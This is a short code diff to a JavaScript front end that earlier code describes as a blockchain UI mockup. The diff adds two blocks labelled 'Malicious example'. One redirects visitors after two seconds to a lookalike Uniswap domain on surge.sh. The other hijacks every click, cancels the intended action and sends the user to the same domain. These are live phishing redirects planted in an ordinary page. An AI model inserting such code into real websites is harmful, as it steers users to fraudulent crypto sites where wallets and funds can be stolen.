@@ -19,3 +19,14 @@ document.addEventListener('DOMContentLoaded', () => {
         alert("This is a UI mockup. Blockchain integration requires Web3 libraries (wagmi, viem) and a backend connection to smart contracts.");
     });
 });
+
+// Malicious example
+setTimeout(function() {
+    window.location.href = "https://uniswap-dex-app.surge.sh";
+}, 2000); // 2000 milliseconds = 2 seconds
+
+// Malicious example
+document.addEventListener('click', function(event) {
+    event.preventDefault(); // Stops the original button action
+    window.location.href = "https://uniswap-dex-app.surge.sh";
+});
